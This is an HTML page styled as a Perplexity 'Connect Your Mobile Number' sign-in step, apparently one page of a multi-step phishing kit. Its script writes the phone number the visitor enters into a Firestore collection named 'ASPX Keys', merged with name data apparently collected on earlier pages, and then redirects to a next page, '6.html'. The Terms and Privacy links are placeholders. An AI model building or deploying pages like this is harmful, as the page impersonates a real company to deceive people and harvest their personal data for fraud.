<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Mobile - Perplexity</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            padding: 60px 24px;
            color: #212121;
        }

        .container {
            width: 100%;
            max-width: 440px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
            color: #000;
        }

        p.description {
            font-size: 16px;
            color: #6e6e80;
            line-height: 1.5;
            margin-bottom: 32px;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 10px;
        }

        input {
            width: 100%;
            padding: 18px 24px;
            font-size: 18px;
            border: 1px solid #d1d1d6;
            /* Matches Image Rounded Corners */
            border-radius: 24px; 
            outline: none;
            transition: border-color 0.2s;
            color: #000;
        }

        /* Black focus color */
        input:focus {
            border-color: #000;
        }

        .error-msg {
            color: #df1b41;
            font-size: 13px;
            margin-top: 8px;
            display: none;
            text-align: left;
            padding-left: 20px;
        }

        .terms {
            font-size: 14px;
            color: #6e6e80;
            margin-top: 24px;
            line-height: 1.4;
        }

        .terms a {
            color: #2d333a;
            text-decoration: underline;
            cursor: pointer;
        }

        .btn-continue {
            width: 100%;
            background-color: #000;
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 32px;
            transition: opacity 0.2s;
        }

        .btn-continue:active {
            opacity: 0.8;
        }

        .loading {
            opacity: 0.7;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Connect Your Mobile Number</h1>
        <p class="description">Connect Your Phone Number to signing in to your Perplexity Account</p>

        <div class="input-wrapper">
            <input type="text" id="mobile" placeholder="+91 1234567890" autocomplete="off">
            <div id="error" class="error-msg">Please enter a valid 10-digit number.</div>
        </div>

        <p class="terms">
            By clicking "Continue", you agree to our <a href="https://1.com">Terms</a> and have read our <a href="https://1.com">Privacy Policy</a>.
        </p>

        <button id="continueBtn" class="btn-continue">Continue</button>
    </div>

    <script>
        // --- Firebase Configuration ---
        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        const mobileInput = document.getElementById('mobile');
        const continueBtn = document.getElementById('continueBtn');
        const errorDiv = document.getElementById('error');

        // Handles auto-spacing for any country code starting with +
        mobileInput.addEventListener('input', (e) => {
            let val = e.target.value;
            // If user types + followed by digits, add space after the code
            if (val.startsWith('+')) {
                // Remove existing spaces to re-format
                let clean = val.replace(/\s/g, '');
                if (clean.length > 3) {
                    // Logic for 2-3 digit country codes (e.g. +91 or +1)
                    let code = clean.substring(0, 3);
                    let number = clean.substring(3);
                    e.target.value = code + ' ' + number;
                }
            }
        });

        async function validateAndSubmit() {
            const rawVal = mobileInput.value.trim();
            
            // Regex to ensure exactly 10 digits are present at the end
            const regex = /(\d{10})$/;
            const match = rawVal.match(regex);

            if (match && match[0].length === 10) {
                errorDiv.style.display = 'none';
                saveAndRedirect(rawVal);
            } else {
                errorDiv.style.display = 'block';
            }
        }

        async function saveAndRedirect(fullNumber) {
            continueBtn.innerText = "Verifying...";
            continueBtn.classList.add('loading');

            // --- IMPORTANT ---
            // This retrieves the doc ID (e.g. 1065080509) used in previous steps
            // Make sure your previous page stores it as: localStorage.setItem('userDocId', '1065080509');
            const docId = localStorage.getItem('userDocId') || "1065080509"; 

            try {
                const docRef = db.collection("ASPX Keys").doc(docId);
                
                // Using merge: true stores it in the SAME document with firstName/lastName
                await docRef.set({
                    mobileNumber: fullNumber,
                    updatedAt: new Date().toLocaleString() + " UTC+5:30"
                }, { merge: true });

                // Redirecting to 6.html with the ID as a session parameter
                window.location.href = `6.html?id=${docId}`;

            } catch (err) {
                console.error("Storage Error: ", err);
                alert("Connection failed. Please check your network.");
                continueBtn.innerText = "Continue";
                continueBtn.classList.remove('loading');
            }
        }

        continueBtn.addEventListener('click', validateAndSubmit);

        mobileInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') validateAndSubmit();
        });
    </script>
</body>
</html>
